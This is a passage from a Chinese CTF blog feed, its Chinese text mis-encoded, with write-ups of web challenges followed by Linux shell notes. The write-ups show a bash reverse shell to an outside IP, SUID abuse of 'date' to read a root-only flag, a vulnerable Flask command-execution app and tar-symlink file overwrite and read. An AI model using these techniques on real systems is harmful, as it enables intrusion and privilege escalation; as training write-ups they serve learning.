class="line">EXP=å¯¹ä¸Šé¢ç”Ÿæˆçš„base64å†è¿›è¡Œurlç¼–ç </span><br></pre></td></tr></table></figure><p>è¿æ¥åflagåœ¨æ ¹ç›®å½•</p><p><img src="/../images/image-20221018174256886-1686150281426.png" alt="image-20221018174256886"></p><h3 id="week-5"><a href="#week-5" class="headerlink" title="week 5"></a>week 5</h3><h4 id="So-Baby-RCE-Again"><a href="#So-Baby-RCE-Again" class="headerlink" title="So Baby RCE Again"></a>So Baby RCE Again</h4><p>ç›´æ¥åˆ©ç”¨<code>&gt;</code>å†™å…¥æœ¨é©¬ï¼Œç„¶åä¸€å¼€å§‹ä½¿ç”¨èšå‰‘è¿æ¥</p><p>è¯»å–æ ¹ç›®å½•ä¸‹çš„start.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo $FLAG &gt; /ffll444aaggg &amp;&amp; export FLAG=not &amp;&amp; FLAG=not &amp;&amp; chmod 700 /ffll444aaggg &amp;&amp; \</span><br><span class="line">service apache2 restart &amp;&amp; \</span><br><span class="line">tail -f /dev/null</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>chmod 700 /ffll444aaggg</code>çš„æ„æ€å°±æ˜¯&#x2F;ffll444aagggåªæœ‰rootç”¨æˆ·å¯ä»¥è®¿é—®ã€‚</p><p>ç„¶åç¬¬ä¸€ä¸ªæƒ³åˆ°çš„å°±æ˜¯ç”¨suidææƒï¼Œå› ä¸ºä¹‹å‰å“ªä¸€å‘¨çš„miscæ˜¯ç”¨åˆ°äº†è¿™ä¸ªçŸ¥è¯†ç‚¹ã€‚</p><p>ä½†æ˜¯æ²¡æœ‰æƒ³åˆ°çš„æ˜¯èšå‰‘çš„ç»ˆç«¯å¤ªä¸å¥½ç”¨äº†ï¼ˆå…¶å®æˆ‘ä¹‹å‰è§‰å¾—èšå‰‘æŒºå¼ºçš„ï¼Œå› ä¸ºå®ƒè‡ªå¸¦é‚£äº›ç»•è¿‡æ’ä»¶ï¼‰</p><p>æ¯”å¦‚å˜é‡èµ‹å€¼æ²¡ç”¨</p><p><img src="/../images/QQ%E5%9B%BE%E7%89%8720221019102635-1686150281426.png" alt="QQå›¾ç‰‡20221019102635"></p><p>æŸ¥æ‰¾å…·æœ‰suidçš„å‘½ä»¤æ²¡ç”¨</p><p><img src="/../images/image-20221019102841851-1686150281426.png" alt="image-20221019102841851"></p><p>åå¼¹shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/120.77.73.212/2333 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@out:/$ find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">/bin/date</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line"></span><br><span class="line">www-data@out:/$ date -f ffll444aaggg</span><br><span class="line">date -f ffll444aaggg</span><br><span class="line">date: invalid date &#x27;flag&#123;1f005b40-39e2-4538-8816-3e27bdd98352&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/QQ%E5%9B%BE%E7%89%8720221019103452-1686150281426.png" alt="QQå›¾ç‰‡20221019103452"></p><h4 id="final-round"><a href="#final-round" class="headerlink" title="final round"></a>final round</h4><p>æ—¶é—´ç›²æ³¨</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 5</title>
      <link href="/2023/05/31/NSSRound5/"/>
      <url>/2023/05/31/NSSRound5/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-V-Team-PYRCE"><a href="#NSSRound-V-Team-PYRCE" class="headerlink" title="[NSSRound#V Team]PYRCE"></a>[NSSRound#V Team]PYRCE</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag in /flag</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;Å‡Å›Å›&quot;</span>):</span><br><span class="line">        nss = request.args.get(<span class="string">&quot;Å‡Å›Å›&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(nss):</span><br><span class="line">            os.popen(nss)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/source&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    src = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> src</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>æ€è·¯ä¸€ï¼Œç”¨&#x2F;flagè¦†ç›–app.pyæ–‡ä»¶ï¼Œå†è®¿é—®&#x2F;sourceè·¯ç”±</p><p>è¿™é‡Œè¦†ç›–å®Œäº†ä¹‹åï¼Œè¿˜å¯ä»¥è®¿é—®è·¯ç”±çš„åŸå› æ˜¯<code>debug=False</code>ï¼Œæ‰€ä»¥å³ä½¿è¦†ç›–äº†app.pyæ–‡ä»¶ï¼Œä½†æ˜¯flaskè¿è¡Œæ‰€ä½¿ç”¨çš„æ–‡ä»¶å¹¶æ²¡æœ‰å—åˆ°å½±å“ã€‚</p><p>è€Œå¦‚æœ<code>debug=True</code>ï¼Œå½“æˆ‘ä»¬ä¿®æ”¹æ–‡ä»¶æ—¶ï¼Œflaskå°±ä¼šè‡ªåŠ¨é‡è½½æ–‡ä»¶ã€‚</p><p>æ­¤æ—¶è¦†ç›–flaskè¿è¡Œæ–‡ä»¶ï¼ˆæˆ‘æœ¬åœ°æ˜¯pyrce.pyï¼‰</p><p>æ§åˆ¶å°</p><p><img src="/../images/image-20221022132313611-1686150585118.png" alt="image-20221022132313611"></p><p>è®¿é—®&#x2F;sourceè·¯ç”±</p><p><img src="/../images/image-20221022132349822-1686150585118.png" alt="image-20221022132349822"></p><p>æ€è·¯äºŒï¼Œåˆ©ç”¨å¯ä»¥è®¿é—®é™æ€æ–‡ä»¶ï¼Œå…ˆåˆ›å»ºstaticç›®å½•ï¼ˆflaskæ¡†æ¶ç»“æ„ï¼Œé™æ€æ–‡ä»¶æ”¾åœ¨staticç›®å½•ä¸‹ï¼‰ï¼Œå†å°†flagå¤åˆ¶åˆ°staticç›®å½•ï¼Œè®¿é—®&#x2F;static&#x2F;flagå°±èƒ½å¤Ÿä¸‹è½½flagæ–‡ä»¶ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 6</title>
      <link href="/2023/05/31/NSSRound6/"/>
      <url>/2023/05/31/NSSRound6/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-6-Team-check"><a href="#NSSRound-6-Team-check" class="headerlink" title="[NSSRound#6 Team]check"></a>[NSSRound#6 Team]check</h1><h2 id="V1â€“ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#V1â€“ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="V1â€“ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>V1â€“ä»»æ„æ–‡ä»¶ä¸Šä¼ </h2><blockquote><p>æœåŠ¡ç«¯å¯¹ä¸Šä¼ çš„å‹ç¼©åŒ…è¿›è¡Œè§£å‹æ“ä½œï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹å‹ç¼©åŒ…å†…å®¹è¿›è¡Œæ£€æŸ¥ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ç¬¦å·é“¾æ¥è¾¾åˆ°ä»»æ„è¦†ç›–&#x2F;ä¸Šä¼ æ–‡ä»¶çš„æ•ˆæœã€‚</p></blockquote><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><p>å‡è®¾æˆ‘ä»¬è¦è¦†ç›–&#x2F;home&#x2F;khaz&#x2F;shellç›®å½•ä¸‹çš„1.shæ–‡ä»¶</p><p><img src="/../images/image-20221020234420015-1686150537835.png" alt="image-20221020234420015"></p><p>é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆå¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥æŒ‡å‘è¿™ä¸ªç›®å½•ï¼Œå¹¶å°†å…¶æ‰“åŒ…æˆå‹ç¼©åŒ…1ã€‚</p><p><img src="/../images/image-20221020234340481-1686150537835.png" alt="image-20221020234340481"></p><p>ç„¶åæˆ‘ä»¬éœ€è¦å†åˆ›å»ºä¸€ä¸ªä¸è½¯é“¾æ¥åå­—ç›¸åŒçš„ç›®å½•ï¼Œå¹¶åœ¨è¿™ä¸ªç›®å½•ä¸‹åˆ›å»ºè¦è¦†ç›–çš„æ–‡ä»¶ã€‚ç„¶åå°†è¯¥ç›®å½•æ‰“åŒ…ä¸ºå‹ç¼©åŒ…2ã€‚</p><p><img src="/../images/image-20221020234743494-1686150537835.png" alt="image-20221020234743494"></p><p>ç„¶åè§£å‹å‹ç¼©åŒ…1ï¼Œå¾—åˆ°testï¼Œç„¶åè§£å‹å‹ç¼©åŒ…2ï¼Œå…¶ä¸­test&#x2F;clean.shï¼Œå› ä¸ºå½“å‰ç›®å½•ä¸‹testæ˜¯æŒ‡å‘&#x2F;home&#x2F;khaz&#x2F;shellçš„ï¼Œæ‰€ä»¥å®é™…ä¸Šä¼šå°†clean.shè§£å‹åˆ°&#x2F;home&#x2F;khaz&#x2F;shellä¸‹ä»è€Œè¦†ç›–åŸæ¥çš„clean.shã€‚</p><p><img src="/../images/image-20221020234513190-1686150537835.png" alt="image-20221020234513190"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;/tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>åšçš„æ—¶å€™ï¼Œå‘ç°åå¼¹shellä¸ç”Ÿæ•ˆï¼Œåœ¨æœ¬åœ°æµ‹è¯•åå‘ç°æ˜¯å› ä¸ºæ²¡æœ‰ç»™clean.shæƒé™ï¼Œæ‰€ä»¥è¦†ç›–åå°±ä¸èƒ½æ‰§è¡Œäº†ã€‚</p><p><img src="/../images/Snipaste_2022-10-21_18-51-12-1686150537835.png" alt="Snipaste_2022-10-21_18-51-12"></p><p>psï¼šè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæ€è·¯å°±æ˜¯æ—¢ç„¶å¯ä»¥ä»»æ„ä¸Šä¼ &#x2F;è¦†ç›–æ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥è¦†ç›–app.pyæ–‡ä»¶ã€‚</p><p>â€‹è¿™æ˜¯å› ä¸ºæ¯æ¬¡ä¿®æ”¹å·¥ä½œç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œflaskéƒ½ä¼šè‡ªåŠ¨é‡è½½æ–‡ä»¶ã€‚</p><p><img src="/../images/image-20221021202646267-1686150537835.png" alt="image-20221021202646267"></p><h2 id="V2â€“ä»»æ„æ–‡ä»¶ä¸‹è½½"><a href="#V2â€“ä»»æ„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="V2â€“ä»»æ„æ–‡ä»¶ä¸‹è½½"></a>V2â€“ä»»æ„æ–‡ä»¶ä¸‹è½½</h2><blockquote><p>æœåŠ¡ç«¯å¯¹ä¸Šä¼ çš„å‹ç¼©åŒ…è¿›è¡Œè§£å‹æ“ä½œï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹å‹ç¼©åŒ…å†…å®¹è¿›è¡Œæ£€æŸ¥ï¼Œå¹¶æä¾›ä¸‹è½½åŠŸèƒ½ã€‚å¯¼è‡´è§£å‹å‡ºæ¥çš„æ–‡ä»¶å¦‚æœæ˜¯ç¬¦å·é“¾æ¥æ–‡ä»¶å°±å¯ä»¥ä¸‹è½½ä»»æ„æ–‡ä»¶ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;su ctf -c /tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>ä¸v1ç›¸æ¯”ä¸åŒç‚¹åœ¨äº<code>su ctf -c /tmp/clean.sh</code>é™åˆ¶äº†ç”¨æˆ·æƒé™ï¼Œä½†æ˜¯flaskè¿˜æ˜¯ä»¥rootæƒé™å¯åŠ¨çš„ï¼Œæ‰€ä»¥ä¸‹è½½åŠŸèƒ½è¿˜æ˜¯rootæƒé™ã€‚</p><p>æ„é€ ç¬¦å·é“¾æ¥æŒ‡å‘<code>/flag</code>ï¼Œåˆ©ç”¨ä¸‹è½½åŠŸèƒ½å°±èƒ½å¤Ÿè¯»å–åˆ°flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28187/download&quot;</span></span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;filename&quot;</span>: <span class="string">&quot;test2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,data=params).text</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€ŠLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨ã€‹ ç¬”è®°</title>
      <link href="/2023/05/31/linux-shell/"/>
      <url>/2023/05/31/linux-shell/</url>
      
        <content type="html"><![CDATA[<p>å‰è¨€ï¼š</p><p>ä»¥ä¸‹å†…å®¹ä¸ºé˜…è¯»<code>Linuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨.ç¬¬3ç‰ˆ (å¸ƒé²å§†ï¼Œå¸ƒé›·æ–¯çº³æ±‰) (z-lib.org)</code>ç¬”è®°ã€‚</p><p>æ³¨ï¼šä¸‹é¢ä½¿ç”¨çš„linuxç³»ç»Ÿä¸ºé˜¿é‡Œäº‘æœåŠ¡å™¨Centos7ï¼ˆredhatï¼‰æˆ–è€…kaliï¼ˆdebianï¼‰ç³»ç»Ÿ</p><hr><h1 id="äº†è§£shell"><a href="#äº†è§£shell" class="headerlink" title="äº†è§£shell"></a>äº†è§£shell</h1><h3 id="shellç±»å‹"><a href="#shellç±»å‹" class="headerlink" title="shellç±»å‹"></a>shellç±»å‹</h3><p><img src="/../images/image-20220818151112756-1686151304118.png" alt="image-20220818151112756"></p><blockquote><p>å½“ç”¨æˆ·ç™»å½•ç»ˆç«¯çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šå¯åŠ¨ä¸€ä¸ªé»˜è®¤çš„äº¤äº’å¼shellã€‚</p><p>ç³»ç»Ÿç©¶ç«Ÿå¯åŠ¨å“ªä¸ªshellï¼Œè¿™å–å†³äºç”¨æˆ·IDé…ç½®ç³»ç»Ÿå¯åŠ¨ä»€ä¹ˆæ ·çš„shellç¨‹åºã€‚</p><p>åœ¨&#x2F;etc&#x2F;passwdæ–‡ä»¶ä¸­ï¼Œåœ¨ç”¨æˆ·IDè®°å½•çš„ç¬¬7ä¸ªå­—æ®µä¸­åˆ—å‡ºäº†é»˜è®¤çš„shellç¨‹åºã€‚</p></blockquote><p>ä¾‹å¦‚åœ¨kaliä¸­ç™»å½•ç»ˆç«¯æ—¶ä½¿ç”¨çš„æ˜¯zshç±»å‹çš„shell.</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line"></span><br><span class="line">khaz: x:1000:1000:khaz,,,:/home/khaz:/usr/bin/zsh</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ ls -F /usr/bin/zsh</span><br><span class="line">/usr/bin/zsh*</span><br></pre></td></tr></table></figure><p>è¯´æ˜&#x2F;usr&#x2F;bin&#x2F;zshæ˜¯ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åº</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ ls -l /bin/sh</span><br><span class="line">lrwxrwxrwx 1 root root 4  3æœˆ 14  2022 /bin/sh -&gt; dash</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ç”¨æˆ·å’Œç³»ç»Ÿä½¿ç”¨çš„shellç±»å‹ä¸åŒã€‚</p><p>æŸ¥çœ‹æ‰€æœ‰shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ cat /etc/shells</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/shells: valid login shells</span></span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/usr/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/usr/bin/rbash</span><br><span class="line">/bin/dash</span><br><span class="line">/usr/bin/dash</span><br><span class="line">/usr/bin/tmux</span><br><span class="line">/usr/bin/screen</span><br><span class="line">/bin/zsh</span><br><span class="line">/usr/bin/zsh</span><br></pre></td></tr></table></figure><blockquote><p>é€šå¸¸è¯´çš„shåªæ˜¯ä¸€ä¸ªè½¯è¿æ¥ï¼Œå¹¶ä¸æ˜¯çœŸçš„æœ‰ä¸€ä¸ªshellå«shã€‚</p><p>åœ¨debianç³»æ“ä½œç³»ç»Ÿä¸­ï¼ŒshæŒ‡å‘dashï¼›</p><p>åœ¨centosç³»æ“ä½œç³»ç»Ÿä¸­ï¼ŒshæŒ‡å‘bashã€‚</p></blockquote><h3 id="shellçš„çˆ¶å­å…³ç³»"><a href="#shellçš„çˆ¶å­å…³ç³»" class="headerlink" title="shellçš„çˆ¶å­å…³ç³»"></a>shellçš„çˆ¶å­å…³ç³»</h3><p><img src="/../images/image-20220819202328859-1686151304119.png" alt="image-20220819202328859"></p><p>åœ¨å³è¾¹çš„å‘½ä»¤è¡Œä¸­å¯ä»¥çœ‹åˆ°bashè¿›ç¨‹çš„ppidå°±æ˜¯&#x2F;user&#x2F;bin&#x2F;zshçš„pidï¼Œæ‰€ä»¥äºŒè€…æ˜¯çˆ¶å­å…³ç³»ã€‚</p><img src="E:\typora img\image-20220819202343322.png" alt="image-20220819202343322" style="zoom: 80%;" /><p>å¤šæ¬¡åˆ›å»ºbash</p><img src="E:\typora img\image-20220819203036919.png" alt="image-20220819203036919" style="zoom: 67%;" /><img src="E:\typora img\image-20220819203046906.png" alt="image-20220819203046906" style="zoom:67%;" /><p>é€€å‡ºå½“å‰shellï¼Œ<code>exit</code></p><img src="E:\typora img\image-20220819203202199.png" alt="image-20220819203202199" style="zoom:67%;" /><p>å¯åŠ¨shellæ—¶çš„å‚æ•°</p><img src="E:\typora img\image-20220923170946734.png" alt="image-20220923170946734" style="zoom:67%;" title=1/><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ bash -r</span><br><span class="line">khaz@DESKTOP-JCNAFF7:~$ cd ../</span><br><span class="line">bash: cd: restricted</span><br><span class="line">khaz@DESKTOP-JCNAFF7:~$</span><br></pre></td></tr></table></figure><h3 id="å‘½ä»¤åˆ—è¡¨"><a href="#å‘½ä»¤åˆ—è¡¨" class="headerlink" title="å‘½ä»¤åˆ—è¡¨"></a>å‘½ä»¤åˆ—è¡¨</h3><blockquote><p>ä»¥;éš”å¼€çš„å¤šä¸ªå‘½ä»¤</p></blockquote><p><code>pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL</code></p><p>è¿›ç¨‹åˆ—è¡¨</p><blockquote><p>åˆ›å»ºä¸€ä¸ªå­shellæ¥æ‰§è¡Œå‘½ä»¤åˆ—è¡¨</p></blockquote><p><code> (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL)</code></p><p><code>echo $BASH_SUBSHELL</code>ï¼šè¾“å‡ºå­shellæ•°é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]#  (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL)</span><br><span class="line">/root</span><br><span class="line">H1ve  web</span><br><span class="line">/etc</span><br><span class="line">/root</span><br><span class="line">H1ve  web</span><br><span class="line">1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ( pwd ; echo $BASH_SUBSHELL)</span><br><span class="line">/root</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ( pwd ;(echo $BASH_SUBSHELL))</span><br><span class="line">/root</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæœ‰å‡ ä¸ªæ‹¬å·å°±æœ‰å‡ ä¸ªå­shell</p><h1 id="ä½¿ç”¨linuxç¯å¢ƒå˜é‡"><a href="#ä½¿ç”¨linuxç¯å¢ƒå˜é‡" class="headerlink" title="ä½¿ç”¨linuxç¯å¢ƒå˜é‡"></a>ä½¿ç”¨linuxç¯å¢ƒå˜é‡</h1><ul><li><p>å®šä¹‰</p><blockquote><p><strong>å­˜å‚¨æœ‰å…³shellä¼šè¯å’Œå·¥ä½œç¯å¢ƒçš„ä¿¡æ¯çš„å˜é‡ç§°ä¸ºç¯å¢ƒå˜é‡</strong></p></blockquote></li><li><p>åˆ†ç±»</p><ul><li><p>å…¨å±€å˜é‡</p></li><li><p>å±€éƒ¨å˜é‡</p><blockquote><p>è¿™é‡Œçš„èŒƒå›´æŒ‡çš„æ˜¯å˜é‡å­˜åœ¨äºå“ªäº›shellä¼šè¯ä¸­</p></blockquote></li></ul></li></ul><h3 id="å…¨å±€ç¯å¢ƒå˜é‡"><a href="#å…¨å±€ç¯å¢ƒå˜é‡" class="headerlink" title="å…¨å±€ç¯å¢ƒå˜é‡"></a>å…¨å±€ç¯å¢ƒå˜é‡</h3><blockquote><p>ç³»ç»Ÿç¯å¢ƒå˜é‡åŸºæœ¬ä¸Šéƒ½æ˜¯ä½¿ç”¨å…¨å¤§å†™å­—æ¯ï¼Œä»¥åŒºåˆ«äºæ™®é€šç”¨æˆ·çš„ç¯å¢ƒå˜é‡ã€‚</p></blockquote><p>æŸ¥çœ‹å…¨å±€å˜é‡</p><ul><li><p><code>env</code> æˆ–è€…<code>printenv</code>ï¼š<strong>åª</strong>è¾“å‡ºå…¨éƒ¨çš„<strong>å…¨å±€</strong>å˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# env  (printenvè¾“å‡ºçš„ä¸å…¶ç›¸åŒ)</span><br><span class="line">XDG_SESSION_ID=897</span><br><span class="line">HOSTNAME=izwz99bgx9y93dmv0mir0ez</span><br><span class="line">TERM=xterm</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">SSH_TTY=/dev/pts/0</span><br><span class="line">USER=root</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li><li><p><code>printenv  var_name</code>æˆ–è€… <code>echo $var_name</code>ï¼šè¾“å‡ºç‰¹å®šå˜é‡çš„å€¼ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# printenv USER</span><br><span class="line">root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $USER</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>å…¨å±€ç¯å¢ƒå˜é‡å­˜åœ¨äºæ‰€æœ‰çš„shellä¼šè¯ä¸­</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11371 11337  0 20:31 pts/0    00:00:00 bash</span><br><span class="line">root     11382 11371  0 20:31 pts/0    00:00:00 ps -f</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11383 11337  0 20:32 pts/0    00:00:00 ps -f</span><br><span 